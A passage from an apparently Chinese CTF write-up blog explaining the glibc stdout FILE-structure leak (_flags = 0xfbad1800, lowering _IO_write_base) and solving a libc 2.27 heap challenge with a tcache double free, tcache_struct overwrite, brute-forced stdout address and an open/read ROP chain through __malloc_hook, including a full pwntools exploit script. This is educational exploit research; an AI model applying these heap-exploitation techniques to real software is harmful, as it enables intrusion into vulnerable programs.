不了解结构体可以先去看一下。</p><p>当然同上面知识点一样，我也只是对于自己的总结可能阐述不清楚，若仍有困惑之处请看这位大师傅的 <a class="link"   href="https://blog.wjhwjhn.com/archives/95/" >https://blog.wjhwjhn.com/archives/95/<i class="fas fa-external-link-alt"></i></a></p><p>我写的那一篇博客提到过，内存中存在着三个文件指针，分别是stderr，stdout，stdin。</p><p><img src="/images/image-20220111161304428.png" alt="image-20220111161304428"></p><p>这三个文件指针一般存放在bss段上用于输出输入数据，所指向的内容在libc中，而结构体内部的内容是可以被修改的，所以当我们有任意地址写的权限是就可以修改结构体实现stdout leak。下面就是stdout的内部结构：</p><p><img src="/images/image-20220111163346092.png" alt="image-20220111163346092"></p><p>我们需要修改的是<code>_flags</code>和<code>_IO_write_base</code>，在这之间的三个指针，我们覆盖<code>_IO_write_base</code>势必会覆盖掉它们，但是这是stdout，而上面这三个主要是输入的时候才会有用，所以直接覆盖成p64(0)即可。</p><p>copy:解释以上指针的作用</p><blockquote><p>其中<code>_IO_buf_base</code> 和<code>_IO_buf_end</code> 是缓冲区建立函数。<br><code>_IO_doallocbuf</code> 会在里面建立输入输出缓冲区，并把基地址保存在<code>_IO_buf_base</code> 中，结束地址保存在<code>_IO_buf_end</code> 中。<br>在建立里输入输出缓冲区后，如果缓冲区作为输出缓冲区使用，会将基址址给<code>_IO_write_base</code>，结束地址给<code>_IO_write_end</code>，同时<code>_IO_write_ptr</code> 表示为已经使用的地址。<br>即<code>_IO_write_base</code> 到<code>_IO_write_ptr</code> 之间的空间是已经使用的缓冲区，<code>_IO_write_ptr</code> 到<code>_IO_write_end</code> 之间为剩余的输出缓冲区。</p></blockquote><p>所以根据以上说法的话，我们只需要将<code>_IO_write_base</code>调小即可输入<code>_IO_write_base</code>与<code>_IO_write_ptr</code>之间的内容。</p><h4 id="flags为什么也要修改？"><a href="#flags为什么也要修改？" class="headerlink" title="_flags为什么也要修改？"></a>_flags为什么也要修改？</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Magic number and bits for the _flags field.  The magic number is</span></span><br><span class="line"><span class="comment">mostly vestigial, but preserved for compatibility.  It occupies the</span></span><br><span class="line"><span class="comment">high 16 bits of _flags; the low 16 bits are actual flag bits.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC         0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC_MASK    0xFFFF0000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_BUF          0x0001 <span class="comment">/* Don&#x27;t deallocate buffer on close. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_UNBUFFERED        0x0002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_READS          0x0004 <span class="comment">/* Reading not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_NO_WRITES         0x0008 <span class="comment">/* Writing not allowed.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_EOF_SEEN          0x0010</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_ERR_SEEN          0x0020</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_DELETE_DONT_CLOSE 0x0040 <span class="comment">/* Don&#x27;t call close(_fileno) on close.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINKED            0x0080 <span class="comment">/* In the list of all open files.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_LINE_BUF          0x0200</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_TIED_PUT_GET      0x0400 <span class="comment">/* Put and get pointer move in unison.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_CURRENTLY_PUTTING 0x0800</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_APPENDING      0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_IS_FILEBUF        0x2000</span></span><br><span class="line"><span class="comment">/* 0x4000  No longer used, reserved for compat.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_USER_LOCK         0x8000</span></span><br></pre></td></tr></table></figure><p>上面是glibc中给出的常量。</p><p>以puts函数输出的真正调用为例，具体调用的顺序是:</p><p><code>_IO_puts -&gt; _IO_sputn -&gt; _IO_new_file_xsputn -&gt; _IO_overflow -&gt; _IO_new_file_overflow</code></p><p>其中检查较为重要的是<code>_IO_new_file_overflow</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) / SET ERROR /</span><br><span class="line">&#123;</span><br><span class="line">    f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">    __set_errno (EBADF);</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_NO_WRITES</code>使用于检验是否可以输出数据的，为1表示禁止，为0表示允许。这个<code>_IO_NO_WRITES</code>在stdout当中为0，在stdin当中为1。根据上面的表达式其实可以看出来我们必须满足 <strong>(f-&gt;_flags &amp; _IO_NO_WRITES)==0</strong></p><p>后面检测<code>_IO_CURRENTLY_PUTTING</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _IO_doallocbuf(f);</span><br><span class="line">        _IO_setg(f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">    If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">    logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">    read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">    makes room for subsequent output.</span></span><br><span class="line"><span class="comment">    Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">    alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely(_IO_in_backup(f)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">        _IO_free_backup_area(f);</span><br><span class="line">        f-&gt;_IO_read_base -= MIN(nbackup,</span><br><span class="line">                                f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">        f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">        f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">    f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">    f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">    f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line">    f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要关心的是<code>_IO_CURRENTLY_PUTTING</code>，这个使用来判断是否初始化的，若是没有初始化过则为0，若是初始化过则为1，一般输出过内容之后就变成了1除非它输出任何东西。如果这里没通过那我们的<code>_IO_write_base</code>会被修改那就达不到泄漏的目的，所以我们要满足 <strong>(f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)==1</strong></p><p>最后一个检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">    count = new_do_write (f, s, do_write);</span><br><span class="line">    to_do -= count;</span><br><span class="line">    <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一部分是进入<code>new_do_write (f, s, do_write);</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span></span></span><br><span class="line"><span class="function"><span class="title">new_do_write</span><span class="params">(FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count;</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">        <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">        you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">        not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">        Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">        unpredictable. */</span></span><br><span class="line">        fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">off64_t</span> new_pos = _IO_SYSSEEK(fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">    count = _IO_SYSWRITE(fp, data, to_do);</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">        fp-&gt;_cur_column = _IO_adjust_column(fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">    _IO_setg(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">    fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">                             ? fp-&gt;_IO_buf_base</span><br><span class="line">                             : fp-&gt;_IO_buf_end);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的是这两个这两句</p><p><code>if (fp-&gt;_flags &amp; _IO_IS_APPENDING)</code></p><p><code>else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</code></p><p>我们这里无论进入那一个语句都是可以执行到下面的，但是一般来说我们都会选择进入第一个因为他内部的代码较少，只有一行。</p><p>所以根据上面的结论来说我的可以计算出_flags的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>(fp-&gt;_flags &amp; _IO_NO_WRITES) == <span class="number">0</span></span><br><span class="line"><span class="number">2.</span>(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">1</span></span><br><span class="line"><span class="number">3.</span>(fp-&gt;_flags &amp; _IO_IS_APPENDING) == <span class="number">1</span></span><br></pre></td></tr></table></figure><p>计算可得，<code>fp-&gt;_flags = 0xfbad1800</code>, 其中<code>_IO_MAGIC = 0xfdab0000</code>，这是个 Magic Number，是固定的。</p><h3 id="一般的利用方式"><a href="#一般的利用方式" class="headerlink" title="一般的利用方式"></a>一般的利用方式</h3><p>一般是将chunk释放进unsorted bin当中，是chunk保存main_arena，然后利用partial overwrite爆破出<code>_IO_2_1_stdout_</code>结构体的位置，随后就是根据上面得出来的值得到<code>_IO_2_1_stdout_</code>的地址来获取libc</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>有了以上的基础我们才可以正式开始看这道题目。</p><h3 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h3><p><img src="/images/image-20220111174241863.png" alt="image-20220111174241863"></p><p>保护全开，好样的！</p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>题目类型是很常规的菜单题，但是没有edit函数和show函数。先看add函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-498h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-494h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">1160</span>]; <span class="comment">// [rsp+10h] [rbp-490h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+498h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;cont...&quot;</span>);</span><br><span class="line">  v2 = read(<span class="number">0</span>, s, <span class="number">0x78</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">112</span> || v2 &lt; <span class="number">0</span> )</span><br><span class="line">    run();</span><br><span class="line">  s[v2] = <span class="number">10</span>;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; s[i] != <span class="number">10</span>; ++i )</span><br><span class="line">    *((_BYTE *)ptr + i) = s[i];</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们malloc的chunk的size是由我们输入的内容长度确定的，而下面的for循环，是将数据写进去，当出现b’\n’时就会结束循环停止写入。</p><p>再看dele函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dele</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    run();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dele_time &gt; <span class="number">2</span> )</span><br><span class="line">    run();</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  ++dele_time;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题很怪的一点就是我们只能删除当前创建的chunk并且总共只能删除三次，而且nssctf贴心的告诉了我们题目运行的环境是ubuntu18那libc版本就是2.27那就代表存在tcache，在不知道tcache struct attack的情况就直接想放弃了。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p><img src="/images/image-20220111181152135.png" alt="image-20220111181152135"></p><p>首先利用double free让我们创建chunk的fd指针只想自身。</p><p><img src="/images/image-20220111181726081.png" alt="image-20220111181726081"></p><p>可以看到我们利用爆破最后一个字节修改了tcache struct当中记录counts的值，再观察一下bin的情况</p><p><img src="/images/image-20220111181843257.png" alt="image-20220111181843257"></p><p>后面也是一样的。接着我们释放chunk，此时储存tcache struct的chunk进入unsorted bin。</p><p><img src="/images/image-20220111182653794.png" alt="image-20220111182653794"></p><p>接着我们创建一个0x50大小的chunk(至于为什么我放到代码当中解释)。</p><p><img src="/images/image-20220111183252695.png" alt="image-20220111183252695"></p><p>接着开始猜stdout的地址。到这一步，成功的概率只有1/256了所以我就不做过程截图了(因为我自己打本地的时候等了五六分钟，他给我来一句程序运行太多，就没了)所以下面直接给exp了。</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./look_face_no_patch&quot;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./look_face_no_patch&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">contents</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;cont...&#x27;</span>)</span><br><span class="line">    r.sendline(contents)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boom</span>():</span></span><br><span class="line">    create(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">    delete()</span><br><span class="line">    delete()</span><br><span class="line"></span><br><span class="line">    heap = <span class="number">0x8010</span></span><br><span class="line">    create((p16(heap)+<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    create(<span class="string">b&quot;\n&quot;</span>.ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    create(<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">    delete()</span><br><span class="line">    create(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x40</span>)<span class="comment"># 放开前面的counts区域，修改后面的tcache_entry指针，并且是tcache_counts为0，为后续做铺垫</span></span><br><span class="line">    stdout = <span class="number">0x8760</span></span><br><span class="line">    create((p16(stdout)+<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment"># 开始爆破stdout的地址(也只需要爆破一位)，这一块chunk是切割的unsorted bin当中的内容，也就是tcache_struct，下去思考一下就能想到我们爆破的是tcache大小为0x40的指针</span></span><br><span class="line">    create((p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x60</span>)+<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">0x30</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment"># 这一步开始修改结构体内部的值</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> u64(r.recv(<span class="number">8</span>)) != <span class="number">0xfbad1800</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    r.recv(<span class="number">0x20</span>)</span><br><span class="line">    stdout = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">131</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(stdout))</span><br><span class="line">    <span class="comment"># libc = LibcSearcher(&#x27;_IO_2_1_stdout_&#x27;, stdout)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">    <span class="comment"># success(libc.address)</span></span><br><span class="line">    libc_base = stdout-libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    pop_rdi = <span class="number">0x000000000002155f</span>+libc_base</span><br><span class="line">    pop_rsi = <span class="number">0x0000000000023e8a</span>+libc_base</span><br><span class="line">    pop_rdx = <span class="number">0x0000000000001b96</span>+libc_base</span><br><span class="line">    push_rsp = <span class="number">0x0000000000024ef4</span>+libc_base</span><br><span class="line">    open_addr = libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    read_addr = libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    write_addr = libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    malloc_hook = libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    create((p64(malloc_hook)+<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>))<span class="comment"># 这一步我们又是从unsorted bin当中切出来位置，但因为上面用了0x20所以我们修改的tcache_entry是大小为0x80的chunk。后面就是正常的构造ROP了</span></span><br><span class="line">    create((p64(push_rsp)+<span class="string">b&#x27;/flag&#x27;</span>+<span class="string">b&#x27;\n&#x27;</span>).ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    payload = p64(pop_rdi)+p64(malloc_hook+<span class="number">0x8</span>)+p64(open_addr)+p64(pop_rdi) + \</span><br><span class="line">        p64(<span class="number">3</span>)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(pop_rsi) + \</span><br><span class="line">        p64(malloc_hook+<span class="number">10</span>)+p64(puts)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">    create(payload.ljust(<span class="number">0x70</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = boom()</span><br><span class="line">            <span class="keyword">if</span>(res == <span class="number">0</span>):</span><br><span class="line">                r = process(<span class="string">&#x27;./look_face_no_patch&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = process(<span class="string">&#x27;./look_face_no_patch&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure><p>上面代码解释可能难以理解，所以我画了一张图。</p><p>我们将存放tcache_struct的chunk释放进unsorted bin当中的后续情况如下图：</p><p><img src="/images/image-20220111190610152.png" alt="image-20220111190610152"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;深刻感觉到了这场比赛的难度，要是参加了的话我可能第一道题都完成不了。这次只复现了前面两道，因为第三题考得更多的是代码审计能力吧。&lt;/p&gt;
&lt;h1 id=&quot;shell&quot;&gt;&lt;a href=&quot;#shell&quot; class=&quot;headerlink&quot; title=&quot;shell&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>长安“战疫”网络安全卫士守护赛wp</title>
